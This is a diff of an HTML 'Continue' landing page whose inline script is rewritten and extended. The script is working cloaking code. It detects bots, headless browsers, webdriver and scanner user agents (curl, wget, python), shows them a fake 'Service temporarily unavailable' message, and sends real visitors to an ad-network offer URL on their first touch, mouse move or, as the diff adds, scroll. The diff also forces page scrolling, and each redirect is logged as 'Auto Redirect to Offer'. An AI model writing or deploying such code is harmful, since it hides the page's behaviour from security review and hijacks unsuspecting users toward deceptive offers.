@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Continue</title>
 <style>
-body{margin:0;padding:0;background:#000;color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
+body{margin:0;padding:0;background:#000;color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;overflow-y:scroll}
 .container{padding:20px;max-width:400px;width:90%}
 h1{font-size:2rem;margin-bottom:2rem;line-height:1.3}
 img{max-width:100%;height:auto;border-radius:10px;margin-bottom:2rem;box-shadow:0 0 15px #e50914}
@@ -15,7 +15,21 @@ img{max-width:100%;height:auto;border-radius:10px;margin-bottom:2rem;box-shadow:
 window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('config','G-H9VLD02NMS');
 </script>
 <script>
-(()=>{const u=navigator.userAgent.toLowerCase(),b=/(bot|crawl|spider|curl|wget|python|fetch|headless|phantom|httpclient|java|axios)/.test(u),p=!navigator.plugins.length,l=!navigator.languages||!navigator.languages.length,w=navigator.webdriver,s=screen.width===0||screen.height===0;if(b||p||l||w||s){document.body.innerHTML="<h1>Service temporarily unavailable</h1>";return}let r=!1,t=()=>{if(r)return;r=!0;setTimeout(()=>{typeof gtag==="function"&&gtag('event','auto_redirect',{event_category:'Redirect',event_label:'Auto Redirect to Offer'});location.href="https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02"},300)};window.addEventListener("touchstart",t,{once:!0});window.addEventListener("mousemove",t,{once:!0})})();
+(()=>{const ua=navigator.userAgent.toLowerCase(),isBot=/bot|crawl|spider|curl|wget|python|fetch|headless|phantom|httpclient|java|axios/.test(ua),noPlugins=!navigator.plugins.length,noLang=!navigator.languages||!navigator.languages.length,isWebDriver=navigator.webdriver,noScreen=screen.width===0||screen.height===0;
+if(isBot||noPlugins||noLang||isWebDriver||noScreen){document.body.innerHTML="<h1>Service temporarily unavailable</h1>";return;}
+let redirected=false;
+function redirectNow(){
+  if(redirected) return;
+  redirected=true;
+  setTimeout(()=>{if(typeof gtag==="function"){gtag('event','auto_redirect',{event_category:'Redirect',event_label:'Auto Redirect to Offer'})}
+  window.location.href="https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02";
+  },300);
+}
+// Eventos para distintos dispositivos
+window.addEventListener("touchstart", redirectNow, { once: true });
+window.addEventListener("mousemove", redirectNow, { once: true });
+window.addEventListener("scroll", redirectNow, { once: true });
+})();
 </script>
 </head>
 <body>
@@ -25,6 +39,7 @@ window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}
 </div>
 </body>
 </html>
+
 
 
 
